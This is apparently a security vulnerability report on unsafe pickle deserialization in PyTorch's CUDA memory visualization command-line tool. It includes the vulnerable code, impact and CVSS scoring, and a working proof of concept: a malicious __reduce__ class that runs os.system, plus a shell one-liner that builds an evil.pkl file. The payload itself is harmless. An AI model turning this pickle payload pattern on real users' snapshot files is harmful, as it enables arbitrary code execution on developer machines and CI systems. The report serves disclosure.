# PyTorch CUDA Memory Visualization CLI RCE 

PyTorch's `torch.cuda.memory_viz` command line tool uses unsafe `pickle.load()` to deserialize user-provided memory snapshot files without any validation. The `_read()` function in `torch/cuda/_memory_viz.py` accepts file paths or stdin (`-`) and directly deserializes the content using `pickle.load()`, allowing arbitrary Python code execution when analyzing malicious memory snapshots.

## Vulnerability Details

**File**: `torch/cuda/_memory_viz.py`
**Function**: `main()` → `_read()`
**Line**: 754-757

### Vulnerable Code

```python
# Line 752-760
def _read(name):
    if name == "-":
        data = pickle.load(sys.stdin.buffer)  # VULNERABLE: reads from stdin
    else:
        with open(name, "rb") as f:
            data = pickle.load(f)  # VULNERABLE: reads from file
    if isinstance(data, list):  # segments only...
        data = {"segments": data, "traces": []}
    return data
```

### Root Cause

The `pickle.load()` function deserializes Python objects without any validation. When deserializing an object with a `__reduce__()` method, that method is automatically invoked, allowing arbitrary code execution. The `_read()` function is called with user-controlled input (file path or stdin) from command line arguments, and there is no validation before passing it to `pickle.load()`.

### Attack Vectors

**Vector 1: File-based attack**
```bash
# Attacker creates malicious "memory snapshot" file
# Victim runs:
python -m torch.cuda._memory_viz stats malicious_snapshot.pkl
# → RCE
```

**Vector 2: Pipe-based attack**
```bash
# Attacker pipes malicious data
cat malicious.pkl | python -m torch.cuda._memory_viz stats -
# → RCE
```

### Data Flow

```
┌─────────────────────────────────────────────────────────────────┐
│ Entry Point: Attacker creates malicious pickle file          │
├─────────────────────────────────────────────────────────────────┤
│ evil.pkl containing MaliciousPayload with __reduce__()       │
└─────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────┐
│ Propagation: CLI tool loads the file                         │
├─────────────────────────────────────────────────────────────────┤
│ argparse parses: args.input = "evil.pkl"                      │
│ data = _read(args.input)  ← calls vulnerable function         │
└─────────────────────────────────────────────────────────────────┘
                              ↓
┌─────────────────────────────────────────────────────────────────┐
│ Sink Point: Code execution                                    │
├─────────────────────────────────────────────────────────────────┤
│ def _read(name):                                               │
│     with open(name, "rb") as f:                                │
│         data = pickle.load(f)  ← SINK                          │
│     → pickle deserializes MaliciousPayload                     │
│       → __reduce__() invoked                                   │
│         → os.system('malicious_command')  ← RCE!              │
└─────────────────────────────────────────────────────────────────┘
```

### Impact

This vulnerability allows attackers to:

1. **Execute arbitrary code** on systems of developers analyzing memory snapshots
2. **Compromise developer workstations** through file-based attacks
3. **Inject malicious code** via pipe input in automated scripts
4. **Poison CI/CD pipelines** that use memory visualization tools

**Affected Users**:
- Developers using CUDA memory profiling/debugging tools
- Automated scripts that process memory snapshots
- CI/CD pipelines with memory analysis steps

**Severity**: HIGH (CVSS 7.8)
- Local attack (requires file execution)
- Low complexity
- No privileges required
- No user interaction required for scripted attacks
```

### Proof of Concept

```python
#!/usr/bin/env python3
"""
PyTorch CUDA Memory Viz RCE PoC
"""

import os
import pickle
import tempfile


class MaliciousPayload:
    """Malicious class that executes code during deserialization"""
    def __reduce__(self):
        return (os.system, (
            'echo "RCE_VIA_MEMORY_VIZ" && touch /tmp/memory_viz_pwned'
        ,))


def exploit():
    # Create malicious pickle file disguised as memory snapshot
    malicious_file = tempfile.mktemp(suffix='.pkl')

    with open(malicious_file, 'wb') as f:
        pickle.dump(MaliciousPayload(), f)

    print(f"[+] Created malicious file: {malicious_file}")
    print("[*] Run: python -m torch.cuda._memory_viz stats", malicious_file)

    # Trigger vulnerability (simulated)
    import subprocess
    subprocess.run(['python', '-m', 'torch.cuda._memory_viz', 'stats', malicious_file])

    if os.path.exists('/tmp/memory_viz_pwned'):
        print("[+] RCE successful!")
        os.remove('/tmp/memory_viz_pwned')
        return True

    os.remove(malicious_file)
    return False


if __name__ == "__main__":
    exploit()
```

**Verification**:
```bash
# Create malicious file
python -c "
import pickle, os
class P:
    def __reduce__(self):
        return (os.system, ('echo RCE > /tmp/pwned',))
pickle.dump(P(), open('evil.pkl', 'wb'))
"

# Trigger vulnerability
python -m torch.cuda._memory_viz stats evil.pkl

# Verify
cat /tmp/pwned  # Should show "RCE"
```

### Impact

```markdown
This vulnerability allows attackers to:

1. **Execute arbitrary code** via malicious memory snapshot files
2. **Compromise developer workstations** when analyzing untrusted snapshots
3. **Inject malicious code** into automated memory profiling pipelines
4. **Chain with other vulnerabilities** for broader system compromise

**Attack Scenarios**:
- Memory snapshot file poisoning in shared repositories
- Malicious attachments in bug reports claiming memory issues
- Supply chain attack through compromised profiling tools

**CVSS Vector**: CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H (7.8 High)
```

---

## CVSS

| 字段 | 值 |
|:-----|:-----|
| **Attack Vector** | Local (需要文件执行) |
| **Attack Complexity** | Low |
| **Privileges Required** | None |
| **User Interaction** | Required (需要用户执行命令) |
| **Scope** | Unchanged |
| **Confidentiality** | High |
| **Integrity** | High |
| **Availability** | High |


---

### version
```
<= 2.11.0.dev20260110
```
